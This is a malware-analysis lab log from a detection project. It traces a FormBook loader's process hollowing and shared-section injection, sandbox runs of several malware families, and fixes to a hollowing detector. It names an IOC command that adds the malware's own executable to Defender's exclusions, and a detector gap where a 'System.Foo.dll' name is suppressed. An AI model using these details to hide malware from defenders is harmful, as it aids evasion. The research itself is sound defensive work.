`powershell.exe` 10940 → `SecurityHealthHost.exe` 11096, a LOLBin not on
`HOLLOWING_TARGETS`, which is why the genuine payload scored nothing while
five ordinary .NET images in `csc.exe` graded **strong**. The identification
confirms the payload was real — which strengthens the case for fixing the
gate rather than weakening it.

---

## What changed, 18–20 Aug

**Four detonations, then four fixes, then four more runs to check them.** The
proving debt is largely paid; what is left is two design decisions.

**Retired:** received-file collection (`0bj`, the AgentTesla exfil arrived and
was verified as the sample's own report), `procmon_filter` (`0bj`),
dropped-file lineage (`0bk`), module integrity (`0bn` — **caught a real hollow
at last**, Dridex mapping a 102,400-byte image over its own 180,224-byte file at
`0x400000`), and the Split-API rule's detection, which now fires on **three**
unrelated families with its strings verified (`0bj`).

**Fixed:** the `process_injection` reason line, which claimed Sysmon saw
something on runs where it saw nothing (`0bo`); `payload_dropped` grading
**strong** on `csc.exe` compilation scratch that every `Add-Type` script drops
(`0bo`); the module-integrity cache (`0bo`); and **`pefile.relocate_image`,
which was 81% of a 28-minute run** — relocations are masked rather than applied
now, 240s of CLR images became 0.1s, and the whole run went 28 minutes to 7
(`0br`, `0bs`).

**Built:** `metadata\status.log`, which tags every status line with how long the
previous step took. **It answered the teardown question on its first run after
three wrong diagnoses had been recorded and retracted** (`0bp`).

---

## The two decisions this wants, and neither is mine to take

> **DECISION 1 IS SETTLED BY MEASUREMENT — 21 Aug, on the guest.** The fix was
> run against the case it was built for and the false positive is gone. The
> control is a benign `Add-Type` compile, the same one that reproduced the
> sample's four images exactly on 20 Aug:
>
> | | dump MB | modules | unmapped | framework | in target |
> |---|---|---|---|---|---|
> | `c14cb5b6` (sample) | -- | **36** | **4** | -- | 4 |
> | benign `norefs2`, 20 Aug | 116.0 | **36** | **4** | -- | 4 |
> | **benign, 21 Aug, fix live** | 118.8 | **36** | **0** | **4** | **0** |
>
> **Same 36 modules, so the compile reached the same depth** -- the check this
> file demands before believing any zero here. The four were *identified and
> suppressed*, not absent: `framework_assembly 4` is the positive control, and a
> run reporting `0, 0` would have meant the test never ran. Module integrity was
> clean alongside it (36 identical, 0 patched, 0 replaced, 0 header_mismatch)
> and `resource_only 1` shows that path still working.
>
> So the benign compile that graded **strong -> High** on 20 Aug now grades
> nothing, and it does so by reading the images' own metadata rather than by the
> compile failing to reproduce. **`mscorlib` was the load-bearing part** and it
> was never suppressed until 21 Aug: its Module table reads
> `CommonLanguageRuntimeLibrary`, so the `.dll` suffix test rejected it. See
> `9c28bab`.
>
> **Still open after this:** the `_FRAMEWORK_PREFIXES` evasion gap
> (`System.Foo.dll` is suppressed by name), and whether `strong` on *any*
> unmapped image is warranted -- that rests on 16 processes, not on the 870
> module comparisons it used to cite. See `74c1385`.

**1. Gap 5's gate scores ordinary .NET — CONFIRMED 20 Aug, by reading the
images.** `unmapped_pe_in_hollowing_target` fires on the CLR's own assemblies
inside `csc.exe`, which `Add-Type` spawns legitimately, and `HOLLOWING_TARGETS`
is mostly managed processes — `regsvcs`, `regasm`, `installutil`, `msbuild`,
`csc`, `vbc`, `ilasm`. **It does not need a malicious sample to fire, it needs
a dump** (`0bq`). The five images it graded **strong** on have now been carved
and identified as `mscorlib` and friends; see below.

On run `c14cb5b6` this became acute: `process_injection` graded **strong** on
five .NET images in `csc.exe` while **the genuine 258 KB payload counted for
nothing**, because `SecurityHealthHost.exe` is not on the list. **A correct
verdict from two cancelling errors is worse than either alone.**

The naive fix — exclude .NET images — would blind the detector to `422e30ed`,
whose payload *is* a .NET assembly injected into `RegSvcs`. The distinguisher is
plausibly *where* the image sits: FormBook took `RegSvcs`'s preferred base
`0x400000` with the real image relocated away; these sit high in a process doing
its job.

**THE PREMISE STANDS — the five images are framework assemblies, 20 Aug.**
All five were carved and read with `dotnet_meta.py`. They are not payloads:

    5,447,680 b  3356 typedefs  29257 methods   mscorlib
    3,547,136 b  2365 typedefs  18170 methods   (framework, unnamed)
    6,668,800 b  3692 typedefs  33669 methods   System.Management.Automation
    1,530,368 b  1176 typedefs   8293 methods   (framework, unnamed)
    5,447,680 b  identical to the first, mapped at a second address

Identified from the identifier heap, not guessed: `DaysTo10000`,
`LOCALE_SMONTHNAME10`, `CERT_QUERY_CONTENT_PKCS10`, `GB18030` for `mscorlib`;
`<InvokeTopLevelPowerShell>`, `<ToPSObjectForRemoting>`,
`System_Management_Automation_AliasInfo`, `DscResourceHelpInfo` for the
PowerShell engine. **Nothing hand-written for injection looks like 33,669
methods.** So the gate graded **strong** on the CLR's own code, exactly as
`0bq` claimed. The scoring asymmetry in the paragraph above is real and this is
the other half of it.

**AND A BENIGN COMPILE REPRODUCES IT.** `benign_baseline.py --only-managed
--no-refs` in the guest — 2,500 trivial classes, no references, nothing
malicious anywhere — produced **`unmapped 2`, both in a hollowing target**.

    run          refs   dump MB   modules   unmapped
    guest 1st    no        31.2       9        0
    guest2       no        48.2      33        0
    refs         YES       39.8      33        0
    norefs       no        62.6      35        2      <-- fires
    norefs2      no       116.0      36        4      <-- reproduces exactly
    c14cb5b6     --          --      36        4

**Benign and malicious are indistinguishable: 36 modules, 4 unmapped, both.**
The four benign images match the sample's on every field — size, typedef count,
methoddef count, every heap size — and all four are identified:

    5,447,680  3356 typedefs  DaysTo10000, Digit100, S400      mscorlib
    3,547,136  2365 typedefs  PERF_NUMBER_DEC_1000, PDH_FMT_*  System.dll
    1,530,368  1176 typedefs  Func`10, Action`10, GetEnumerator System.Core.dll
    6,668,800  3692 typedefs  InvokeTopLevelPowerShell, PSObject  S.M.Automation

**The detector cannot tell them apart because there is nothing to tell apart**
— the sample's hits carried no information at all.

**The variable is how far into its life the process is dumped**, not
references, not the sample. Monotonic in module count every time. Every earlier
zero was a dump taken too early, which is why this was written up as "premise
refuted" and then withdrawn twice before it reproduced.

**Reproducing it needs the compile to reach ~36 modules.** A freshly reverted
guest compiles 2,500 classes too fast to get there — that run gave a single
dump at **9 modules**. `--probe-classes` exists for this; 12,000 reaches 36 on
a clean VM. **If a re-run reports 0, check the module count before concluding
anything** — below the mid-30s the test has not run.

**So `unmapped_pe_in_hollowing_target` is unsound as written.** It needs no
malicious sample, only a dump taken late enough, and `HOLLOWING_TARGETS` is
mostly managed tooling — so any run that catches one of them working scores it.

**The fix, with a principle behind it:** exclude images whose metadata
identifies them as **known framework assemblies**. The benign and malicious
sets are the same four, all framework. This leaves `422e30ed` fully detectable,
because its payload is a *custom* assembly injected into `RegSvcs` — not
`mscorlib`. Reading the image's own metadata is what discriminates; an address
heuristic would not have.

**No attribution bug. `System.Management.Automation` really is in `csc.exe`.**
This was chased as a suspected mislabel and it is not one: `analyze_dump`
reports `host_image = …\v4.0.30319\csc.exe` on both benign dumps, and the four
benign images carry **byte-identical sizes to the sample's** — 3,547,136 /
6,692,864 / 1,556,480 / 5,447,680.

**The mechanism is ordinary and explains everything.** `csc.exe` memory-maps
its reference assemblies to read their metadata. Mapped files are not loaded
modules, so no module entry covers them and the carver calls them `unmapped`.
`Add-Type` passes the calling session's loaded assemblies as references, which
is why the **PowerShell engine** turns up inside a C# compiler. It is not
evidence of anything. It also explains why the `-ReferencedAssemblies` arm
changed nothing: `Add-Type` was already passing them.

**Recording the environment fact:** this cannot be measured on the host at all.
`MiniDumpWriteDump` returns `0x80070005` `ERROR_ACCESS_DENIED` on a `csc.exe`
spawned by our own PowerShell, at the same integrity level, on a host where
sixteen other processes dump cleanly. Bitdefender is the near-certain cause —
`powershell` → `csc.exe` → something dumping it is a textbook malicious pattern.
The identical code dumps it in the guest. **Any measurement involving a spawned
child belongs in the guest.**

**2. The spawn dump fails with `ERROR_PARTIAL_COPY`, not a race.** `0bt`
suspended the child to stop it exiting; `0bv` proved that wrong — two processes
were held successfully (`held=True`) and both dumps failed identically, on a
process demonstrably alive 36 seconds later. **ProcDump renders `0x8007012B` as
"Target process no longer running", which is false**, and that string cost three
runs. The image is being rewritten mid-hollow and **the writer is the parent,
not the victim**. Suspending the *parent* for the child's dump is what follows;
it is untried and unqueued.

---

## Run settings that work, for `af2d8300…`

    offsets 3, 10, 25, 55    spawn re-dump 2    max processes 24
    timeout_seconds 240      <- NOT 180

**240 is load-bearing.** `SecurityHealthHost.exe` spawns at ~t160 and exits at
~t198. At 180 the watcher stops before it exits and the payload is never
captured; the `process-exit` trigger is what gets it, not the spawn dump.

**Samples are no longer on this host** — re-acquire by hash, see *Environment
facts*. **A `git pull` on the guest does not survive a revert**; `docs/WORKFLOW.md`
now documents that, the baseline-replacement order, and how to tell a wedged
`restoringsnapshot` from a slow one.

> **The method lesson of these three days, earned six times.** Every wrong turn
> was a guess about where cost or blame lay, and every one was cheaper to
> measure than to argue: the module-integrity cache (wrong), `fast_load`
> (measured at 1.1x before shipping), the spawn-dump race (wrong), a guest
> assumed stale that was current, and a field set on a record but dropped by the
> summary projection. **Build the instrument first.** `status.log` cost less
> than any single one of those and answered immediately.

### Pick up here — 17 Aug

**Superseded by the 20 Aug entry above; read that first.**


**Start here if you are cold. This supersedes the 16 Aug entry below**, which
stays because its subsections are the working record.

**Queues.** Build empty, signature empty. `0av` ran as run `27f81ffc` and is
closed; **`0au` is closed without a detonation** — it asked whether the real
`CreateProcessW` accepts `C:C:\…`, which is a Win32 question answerable on this
bench, and the answer is `ERROR_INVALID_NAME` for all twelve (`0be`).
**Detonation: one entry, `0bi`** — VIPKeylogger `8ceb2c53…`, chosen to finish
the *dynamic module* rather than the crash, with ten predictions recorded before
it runs.

> **The goal is now finishing the dynamic module, and the crash is not on that
> path.** Build queue empty, every detector built, 662 tests. What remains is a
> **proving** debt: the table in *What is proven, and what is not* has a dozen
> rows reading *Fixed, unproven* or *never fired*, and most of them need one
> **completed hollow** — which `422e30ed` cannot give, because it bails by
> design. **Samples are also no longer on this host** (see *Environment facts*);
> re-acquire by hash before planning anything.

**The three things that changed today, and none is a small edit:**

1. **The detonation ran and all twelve `verify_run.py` rows passed** — including
   the two that failed on `d7cc5044`. **This project's own YARA rules fired on a
   guest for the first time** (`ContextCookie`, `Loader_Stage2`,
   `Split_API_Injection_Loader`, all memory-only). See `0aw`.
2. **A new IOC that is not loader mechanics**: the sample spawns PowerShell and
   runs `Add-MpPreference -ExclusionPath` **on its own executable**. Attribution
   checked against `bootstrap_tools.ps1`, which uses the same cmdlet on the
   tools directory — the path is what distinguishes them. See `0aw`.
3. **`[ctx+0x6d8]` is a cookie, and the crash is a designed bail.**
   Normally it holds a *runtime self-address*; the Sandboxie branch swaps in the
   hardcoded `0x32dfd514`, which makes every `x ^ cookie` recovery in the context
   yield garbage. See `0ax`–`0az`. **And `0x32dfd514` is the author's poison
   address**, not an arbitrary constant: it is the only immediate in the image
   used as `call <abort helper> ; jmp <it>`, twice, proven by execution. The
   gate writes the poison address into the cookie. **"Broken build" is no longer
   a live reading of the store.** See `0bd`.

**The one open question on the crash, and every link in it is now a
measurement** (see `0bf`, which closed the last two):

    the guest's cookie held 0x32dfd514   <- the fault's register file: edx is
                                            the poison, eax is poison ^ 0xec
    -> only rva 0x1605f writes it        <- 0ax; census re-derived in 0bb
    -> gated on a module hashing to 0xe11da208
    -> the guest's own PEB->Ldr walk has four entries and none of them does
                                         <- guest_ldr_walk.py, the list the
                                            gate itself reads

They cannot all be true, and **all four are now measured on the guest** — `0bg`
diffed its executing image against the bench artifact and found the gate block,
the lookup function, the decoder and both stores byte-identical. The 1.62% that
differs is four regions the guest had not yet decrypted, plus one 260-byte
scratch buffer. **Self-modification is out; propagation is out (`0az`); a second
store site is out (`0ay`); no image was injected and unlinked (`0bg`).**

**The only hypothesis left is temporal**: the `PEB->Ldr` list at *gate time* held
something the list at *dump time* does not — unlinked and its memory freed, so
it leaves no `MEM_IMAGE` region and no unloaded-module entry. A dump is one
instant and the gate ran at another, so **no further reading of this artifact
can settle it.** That is the honest boundary: the next real move is a guest
measurement taken *while the gate runs*, and the instrumentation route for that
is still undecided.

**The structural difference that was supposed to be the next thread is gone.**
"The bench's context is on the stack, the guest's copies on the heap" was never
measured. It is now: **six of the guest's seven are on its own thread stack**,
one is private committed memory, and the bench's three are on its stack — same
shape, no divergence. See `0ba`. **There is no candidate route left on that
path**, which is worth saying plainly rather than letting the next session
inherit a lead that does not exist.

The census behind it also grew: **23 references to `+0x6d8`, not the 18 `0ax`
recorded.** The store census is unchanged so `0ay`/`0az` stand, but one of the
five missed reads is `rva 0x1601b`, which is what decides whether the cookie
gets initialised at all — and reading the gate block in full shows it
**overwrites a live cookie rather than filling a blank one**. See `0bb`.

**What that leaves as the one live step.** Hooking all 23 sites over a full
clean run finds **exactly one context, on the stack, and its first touch is the
computed store** — so nothing reads the cookie before it is written, and the
uninitialised-pointer half of `0ax`'s leading model does not happen on this
bench. It is still possible on the guest, and it is now the only unmeasured step
in that model. See `0bc`.

**Harness changes today, all with tests, 650 passing:** `PostThreadMessageW`
implemented; `CreateProcessInternalW` now **validates the path** and that changes
every stage-4 census (`0at`); loader entries carry real `FullDllName`s in
`System32` with WOW64 redirection modelled (`0ap`, `0aq`); `restore()` refuses a
resume that contradicts the state's env toggles; and `dynamic_analysis/minidump.py`
gained `threads()`, `memory_info()` and `region_of()`, which is what made `0ba`
answerable at all.

> **Method warning, earned four times in two days.** `emu_start`'s `count` is
> **instructions**, not blocks, and a truncated run reports "nothing happened"
> in exactly the shape of a real negative. It caught the RUN CHECK in `0aa`,
> `stage3_tail.py`, `stage4_gate.py` and `cookie_spread.py` — the last three all
> written *after* the lesson was recorded. **Put the EIP check in a probe before
> its first run.**

### Pick up here — 16 Aug

**Superseded by the 17 Aug entry above; read that first.** Build queue empty,
signature queue empty.
**The detonation queue has one entry, `0au`**, and it is blocked behind the
stage-3 crash rather than ready to run. **Stage 4 is understood, including why it does not inject
here** — see *THE QUESTION*, answered, and `0ai`–`0ao`. The `0a`–`0l`
subsections are the working record of how today got there, including six
hypotheses that were built and falsified — read them for method, not for
current state, because several contain framings this section retracts.

**Settled, do not re-derive:**

- **A YARA rule exists and is validated** —
  `RingForge_FormBook_422e30ed_ContextCookie` on the `[esi+0x6d8]` cookie. Two
  runs, three rules, all memory-only, 0/7,014 clean set. **Stage-agnostic by
  necessity**, not as a placeholder: stages 3 and 4 share 97.5% of their bytes
  and the rest is ciphertext, so no stage-specific anchor exists — see *And
  there is no stage-4 anchor to be had from these two artifacts* above.
- **The baseline was rebuilt** and carries the local rules. Before today, **no
  run this project ever did had scanned one of its own rules.**
- **Run `38f27025`** crashed in stage 3 like the ten before it. Its summary was
  lost; the reconstruction above is the record. `memory_yara_rescan.json`
  survives and is the authority for its scan.

**What stage 4 actually does, end to end (this is the durable result).** Every
line below is from a run that reached a clean return at 60,928,346 blocks with
EIP outside the payload — not from a disassembly reading, which is the method
that failed repeatedly here:

    trampoline -> three do-nothing delay loops -> writes the 0x1d handshake flag
    -> builds a UNICODE_STRING for "kernel32.dll" via the PEB loader list
    -> scans memory backwards for its own 20-byte header, and finds it
    -> opens ntdll.dll as a FILE and queries its name   (the unhooking check)
    -> resolves 8 imports against ntdll's real export names, 8 for 8
    -> builds a SysWOW64 path and walks a 12-entry host-candidate list  (+0x192b0)
    -> for the first candidate that opens: reads the file, creates it
       CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW,
       ProcessBasicInformation -> PEB, reads PEB+8 = ImageBaseAddress  (+0x190f0)
    -> ~2M blocks of CRC-32, RC4 and name folding
    -> waits 6s for an injection request that never comes           (+0x03f8e)
    -> waits 6s for a resume request that never comes               (+0x040ae)
    -> marks both slots failed and RETURNS, without unpacking its body

**It is a process-hollowing *server***: it prepares the host and then waits to be
told to map and resume (*0ai*). The `0aa` figures of "403 blocks, one API call,
no file opened" came from a run truncated at 16,096,220 blocks by an instruction
budget mistaken for a completion.

**The candidate list is twelve, not eleven.** `+0x07210` is a switch on index
`0..0xb` — twelve stack-string constructors — and the walk's bound is
`cmp [ebp-4], 0xc`. The walk opens each candidate's file *before* creating it and
skips to the next candidate when that open fails, so `0ad`'s eleven
`CreateProcessInternalW` calls mean **one of the twelve never opened**; which one,
and why, is not measured. The eleven *names* in `0ad` still stand as the IOC —
this only says there is a twelfth, still to be decoded from `+0x08a50`.

**The other 43 pages are its still-packed body**, and no *direct* branch or call
in the executed code reaches them (*0j*). That is weaker than "nothing reaches
them": there are **9 indirect call sites** whose targets are not statically
known, and `0ai` shows they matter — the injection server at `+0x03f40` has no
direct caller anywhere in the image and ran anyway.

#### THE QUESTION — ANSWERED, 16 Aug

**Does stage 4 ever intend to inject in this environment? Yes.**

The injection routine is at payload `+0x03fb0`, and it is shared-section
injection with nothing missing from it:

    NtCreateSection(SECTION_ALL_ACCESS 0xf001f, PAGE_EXECUTE_READWRITE, SEC_COMMIT)
    NtOpenProcess(0x438 = VM_OPERATION|VM_READ|VM_WRITE|QUERY_INFORMATION)
    NtMapViewOfSection   -> the remote process
    NtMapViewOfSection   -> this one

**It never ran because it sits six instructions past a poll waiting for a
peer**, at `+0x03f8e`:

    do { Sleep(1000); if (*state == 1) goto inject; } while (++n < 6);
    *state = -1; return 0;                       <-- what actually happened

**The twelve sleeps are two of those polls, six each** (*0ai*), and both timed
out on a word that nothing in this run ever writes. Stage 4 is the **server**
side of a two-party injection protocol: it prepares the host, then waits to be
asked.

**The asker is another process** (*0am*), and it is the loader (*0an*, *0ao*).
The word lives in the anonymous RWX section stage 3 mapped into both this process
and the explorer child it injected, and there is nothing a single-address-space
emulator can do about it.

**One qualification, added after the fact and load-bearing (*0at*).** Everything
above is reached only because this harness's `CreateProcessInternalW` accepted a
malformed path. With the path validated, stage 4 fails all twelve candidates and
**never reaches the poll at all**. The injection code and the rendezvous are
real; the route to them, in this build, is not.

Answer the poll and the injection runs — `NtCreateSection`, `NtOpenProcess`,
`NtMapViewOfSection` ×2, `NtResumeThread`, both state words left at 2 (*0aj*).

**So the negative in `0ae` stands and its explanation is now wrong.** Stage 4
does not inject *here*, and it is not because it decided not to, and not because
an API is unimplemented. It is because the harness cannot present a second
participant. That is a different class of gap from the four closed today, and it
is the first one a longer run or another stub cannot touch.

Everything below is the working record, including six falsified hypotheses and
one artifact this harness invented (*0af*). Read it for method. The subsections
marked ANSWERED or RETRACTED say which parts survived — note that `0ag` is now
retracted in full and `0ah`'s conclusion is qualified.

#### 0am. THE PEER IS ANOTHER PROCESS — the control block is in a shared section

**Checked, from `after_handshake.state` alone, no run needed.** The question
asked was "did stage 3 create `0x3eee874` as a *named* section". **It is not
named — and that is the wrong test.** It is anonymous and it is shared anyway,
because it is handed over by handle rather than found by name.

The control block sits in allocation #46, `0x028ea000` + 24,820,736 bytes, which
also carries the stage-4 image:

    stage-4 image  at view +0x15a9c74
    control block  at view +0x1604874

and that allocation is a **section view**. Stage 3's log, in order:

    [537,034,701blk] NtOpenProcess(&h, 0x438, &oa, &cid)          -> handle 0x40c
    [542,537,463blk] NtCreateSection(&h, 0xf001f, NULL, &max,
                                     PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)
                                     ^^^^ ObjectAttributes NULL: anonymous
    [547,430,617blk] NtMapViewOfSection(0x410, 0xffffffff, ...)   <-- this view
    [549,873,280blk] NtMapViewOfSection(0x410, 0x40c,      ...)   <-- and into
                                                                      the other
                                                                      process

**So the word stage 4 polls is in memory shared with the process stage 3
injected into** — the explorer child (*Serving one child of explorer reached the
injection*). This is the same section that entry already describes as
"deliberately sized at random between 2 MB and 131 MB"; 24,820,736 is inside
that range. **It is a second process, not a second thread**, and no amount
of threading in one emulator will serve it.

**Which of the two processes does the asking is settled in `0an`, and it is not
what was written here first.** This section originally said the peer was "the
copy of FormBook on the far side of the mapping", meaning the injected child.
It is the **loader**: our stage-4 run *is* the child, and the child holds the
server side.

**Strong corroboration, unlooked for.** Stage 3's sequence and stage 4's gated
routine at `+0x03fb0` use the *same constants*: `NtOpenProcess(0x438)`,
`NtCreateSection(0xf001f, PAGE_EXECUTE_READWRITE, SEC_COMMIT, ObjectAttributes
NULL)`, `NtMapViewOfSection` into self then into the remote process, ViewShare 1.
Stage 4's gated code is the routine the loader has already run once. That is
independent of the disassembly and of the forced run.

**Two harness traps, and the first one nearly produced the opposite answer.**

1. **`restore()` does not restore `section_requests`, `section_views`,
   `section_maps`, `sections`, `named_objects` or `remote_targets`.**
   `_init_observations()` resets them and nothing puts them back, so a restored
   state reports **zero sections for a loader that made three**. The first pass
   at this question read those fields and was about to conclude "not a section
   at all, just heap". `calls`, `allocs` and `log` *are* restored and are the
   only ones that mean anything on a restored state.
2. **The allocation-to-call correlation is one-to-one only if every allocating
   call is counted.** `allocs` is append-ordered and every allocation goes
   through `Emulator.alloc`, so the n-th allocating log entry is the n-th
   `allocs` entry — but `RtlDosPathNameToNtPathName_U` allocates too
   (`emulate_native_stub.py:755`) and is easy to miss. Leaving it out gave 53
   entries against 55 allocations, and the two-entry shift relabelled #46 from
   `NtMapViewOfSection` to `NtAllocateVirtualMemory` — the whole answer. **Check
   the two lists are the same length before reading anything off the pairing**;
   the script prints the mismatch and refuses rather than lining them up anyway.

Also noted in passing: **`_next_handle` resets to `0x400` on restore**, so handle
numbers are not unique across a resumed chain — the log shows cycle 2 using
`0x404`/`0x408` after cycle 1 used `0x40c`/`0x410`. Handle identity within one
cycle is sound; across cycles it is not.

#### 0an. The child has never run anything — and 0am named the wrong peer

**Asked: did the explorer child ever run stage 4's requester side? No, and it has
never executed an instruction here.**

`NtResumeThread` is bookkeeping (`emulate_native_stub.py:1212`) — recorded,
answered success, no second execution context created. So no hijacked thread has
ever run on its own. The only far-side execution this project has ever performed
is pointing the emulator's single thread at the entry by hand, and
`NtSetContextThread` recorded that entry as:

    [725,274,879blk] NtSetContextThread  eip=0x03e9f89b  esp=0x10080000

which is `INJECT_EIP` and `INJECT_ESP`, byte for byte, in every `stage4_*.py`.
**"Stage 4" *is* the child's hijacked thread.** So the side that has run is the
server, and the requester has never run in any process. Corroborated
independently: the control block is `0x40` bytes of zero in the state as saved,
so nobody had posted a request by then either.

**There are three stage-4 instances, not one.** `thread_contexts` is restored
(unlike the section fields — see `0am`) and holds three hijacks:

    handle 0x414  eip 0x03e9f89b  view 0x028ea000 +0x15b589b   <-- our stage 4
    handle 0x40c  eip 0x0550b975  view 0x04156000 +0x13b5975
    handle 0x418  eip 0x089211aa  view 0x07a42000 +0xedf1aa

Same `+0xbc27` entry offset into the body in all three, so it is the one 273,408
byte image three times, each in its own randomly-sized section — the "2 MB to
131 MB, filled with keystream" behaviour, once per target. The identical ESP
across all three is what says three address spaces rather than three threads.

**So `0am` named the wrong peer.** Each section is mapped exactly twice: into the
loader, and into one target. The other two stage-4 copies hold different views
and cannot see `0x3eee874`. The only other holder of *this* block is **the
loader's own process**.

**And the loader is not silent — `stage3_tail.py` resumes its thread rather than
the injected one.** It sleeps 49 more times, sixty 1-second iterations in all,
and then:

    [132,035,451blk] PostThreadMessageW(idThread=0x1404, Msg=0x111,
                                        wParam=0x0, lParam=0x0)

`0x111` is **WM_COMMAND**. `0x1404` is **5124**, and `win32_emu_env.py:550` gives
every served process one thread with CLIENT_ID `(pid, pid + 4)` — so 5124 is
`notepad.exe`, pid 5120, **the explorer child it just injected**. The loader
injects, resumes the thread, waits a minute, and then pokes that thread by
message.

**`PostThreadMessageW` is UNHANDLED**, so `nargs` is 0 and its four arguments are
left for the caller's `ret` to return into. The first run of this probe carried
on regardless for 132M blocks and died at `0x02014f78`. **"Stage 3 never writes
the control block" is therefore a bound, not a result** — it holds up to the
signal and says nothing past it, which is exactly where it stops being
uninteresting. The probe now captures the arguments and stops.

**It was implemented, and `0ao` is what it bought.** The caution written here
first — "answering it would make the stack sound and deliver nothing" — was right
about the message and wrong about the value. It does deliver nothing. It also
made the loader's own continuation past the signal measurable for the first
time, and that is what excluded the loader as the peer.

#### 0ao. The loader is not the peer either — it signals and exits

`PostThreadMessageW` is implemented (`emulate_native_stub.py`, arity 4, answered
TRUE for a thread of a process `served_process_list()` claims and FALSE
otherwise, and it **announces at the call that nothing receives it**). 620 tests
pass. With it, the loader's thread runs to its own end:

    60 x NtDelayExecution(1000ms)        the poll, 11 of them before the snapshot
    PostThreadMessageW(5124, WM_COMMAND) -> 1, notepad.exe's thread
    4 x NtDelayExecution(1000ms)
    NtClose, NtFreeVirtualMemory
    ExitProcess                          eip 0x7602b010

**No write to the control block, across 144,117,944 blocks, 12,082,493 of them
after the signal was answered.** So the loader injects three times, waits a
minute, pokes the child's thread with one message, tidies up and exits. It never
posts the request.

**Both candidate peers inside this harness are now excluded by measurement.** The
child has never executed (*0an*) and the loader demonstrably does not write the
block. So the requester runs in neither — which points at a third context in the
*child*: the message the loader sends is what would drive it, and our stage-4 run
is one thread of that child running the server side. That is consistent with the
requester at `+0x03e70` having ordinary direct callers while the server at
`+0x03f40` has none and is dispatched through a pointer.

**A wrong answer invented behaviour again, and this time inside one sitting.**
The first run after the stub landed forgot `RINGFORGE_EXPLORER_CHILD=1`, so
`served_process_list()` no longer held `notepad.exe` and the harness answered
FALSE for the thread of the process it had hijacked 700M blocks earlier — the
contradiction the opener of `served_process_list` was written against, arriving
by a route it did not cover. The payload's failure path then issued **a second
`PostThreadMessageW(5124, 0x8003, wParam=0x2fce50)`** — `WM_APP+3` with a pointer
argument — which **does not exist in the correct run**. An hour spent on that
message would have been an hour spent on the harness. `stage3_tail.py` now exits
2 unless the toggle is set.

**The env-var hazard is general, and `restore()` now guards it.** A stored state
is a function of the environment that produced it and `restore()` does not carry
that environment, so any toggle changing what the harness *claims exists* has
this shape: the state commits to a fiction and the resume forgets it.

`Emulator.ENV_TOGGLES` lists them (`RINGFORGE_EXPLORER_CHILD`,
`RINGFORGE_FORGE_MODULE`), snapshots record them at v4, and `restore()` refuses a
resume that contradicts one:

    after_handshake.state was written with RINGFORGE_EXPLORER_CHILD='1' and this
    process has it unset. The state holds pids, handles and memory that name a
    process the harness would now deny exists ... Set RINGFORGE_EXPLORER_CHILD=1

**Asymmetric, deliberately.** Removing a toggle the state relied on is fatal;
*adding* one it lacked is allowed and only announced — `after_scan.state`
predates the toggle and is routinely resumed with it on, and that is the
documented route to the injection. Breaking it would be breaking the route.

**Every state on the artifact drive predates v4**, so silence in an old snapshot
proves nothing and is not treated as proof. The fallback is evidence: stage 3's
poll never leaves its loop unless a child of explorer is served, so a state
carrying `NtSetContextThread` or `NtMapViewOfSection` was written with the toggle
on whatever it records. Six tests in
`dynamic_analysis/tests/test_restore_env_guard.py` pin both directions, the
pre-v4 inference, and a drift check that fails if a new `RINGFORGE_*` toggle
appears without a decision about it. 626 pass.

**And one more of the same family, caught in the script written to record it.**
`stage3_tail.py`'s "no writes" branch read *"stage 3 never posts a request, so it
is not the peer"* — a conclusion it printed happily for a 200-block smoke run
that never reached the signal. Same shape as the RUN CHECK that certified its own
truncation (*0aa*). It now reports where the run actually ended and concludes
nothing.

#### 0aw. RUN `27f81ffc` — nothing on the guest hashes to `0xe11da208`

**`0av` ran, 17 Aug, and C3 holds.** All twelve `verify_run.py` rows passed,
including two that failed on `d7cc5044`: there *was* a `RegSvcs` image to examine
(`header_mismatch on regsvcs.exe`, base `0x400000`) and registry collection
worked (72,587 reads, 0 naming a VM artifact). Dump offsets `1, 25` plus
re-dump-children-after-1s got the sample dumped this time.

**The measurement, both scopes:**

    scoped to RegSvcs.exe   1,036 Load Image events, 10 in scope, 9 distinct pairs
    unscoped                1,036 events, 17 processes, 574 distinct pairs,
                            2,296 hashed forms
    matching 0xe11da208     NONE, in either scope

**So the "the guest really had it" route is closed by measurement, not by
inference.** No image loaded into any process during the capture — sample,
`RegSvcs`, `powershell`, `conhost`, `lsass`, `svchost`, or the pipeline's own
`procdump64` — has a name hashing to the gate value in any of four forms.

**Predictions, scored honestly:**

| | |
|---|---|
| C1 | **PASS** — 10 `Load Image` events for `RegSvcs.exe`; the collector was listening |
| C2 | **PARTIAL** — `ntdll.dll` and `kernel32.dll` fired for `RegSvcs`, `user32.dll` did **not** |
| C3 | **PASS** — nothing matches, across 574 pairs |
| C4 | **PASS** (indirect) — `WerFault.exe` and `wermgr.exe` both ran and were dumped, and the WER row records `5ff2b99b` against `68531ee1` |

**C2's miss is not a failed control, and saying why matters.** `user32.dll` fired
for eleven other processes, so the check works; it is absent from `RegSvcs`
because `RegSvcs` never got that far. Which is the incidental finding of the run:

**`RegSvcs.exe` loaded nine images and never the CLR.** A real `RegSvcs.exe` is a
.NET tool and loads `mscoree`, `clr`, `mscorlib` and dozens more. Nine loads, no
managed runtime, dead in seconds — that is what a process whose image was
replaced before it ever ran looks like, and it is a third independent line of
evidence for the hollowing alongside the WER timestamp and the module-integrity
header mismatch.

**The bound, stated because the script states it.** `Load Image` covers images
mapped *by the loader*. A manually mapped DLL produces no event — but it also
never enters the loader list, so the sample's own lookup could not find it
either. The two blind spots coincide, which is what makes this negative worth
something rather than a gap.

**Where that leaves the crash.** Both remaining readings in the older section —
broken build, deliberate bail — survive, and a third is now the most likely:
**this project's model of the gate is wrong.** The store was shown conditional on
the lookup by forging a name that hashes to `0xe11da208` and watching the branch
be taken; that proves the path *exists*, not that it is the only one. The next
question is a bench question, not a detonation one: **is
`mov dword [esi+0x6d8], 0x32dfd514` reachable by any route other than a
successful lookup** — another store site, another writer of that dword, or the
value arriving in the context from somewhere else entirely.

**`0au` is unanswered and it is not this run's fault.** The seventeen processes
include no explorer child, no `notepad.exe`, and none of the twelve host
candidates. Stage 4 never ran, so there was no `CreateProcessW` to observe.
`Select-String 'C:C:'` over the capture returns nothing — **unobserved, not
refuted**, which is what "stage 4 never ran" predicts and says nothing about the
path. It stays queued behind the crash.

**First look at the gate-reachability question, and it is not finished.** The
constant `0x32dfd514` appears **three times** in the late allocation dump:

    rva 0x16065   the immediate of  mov dword [esi+0x6d8], 0x32dfd514   (known)
    rva 0x0d809   unclassified
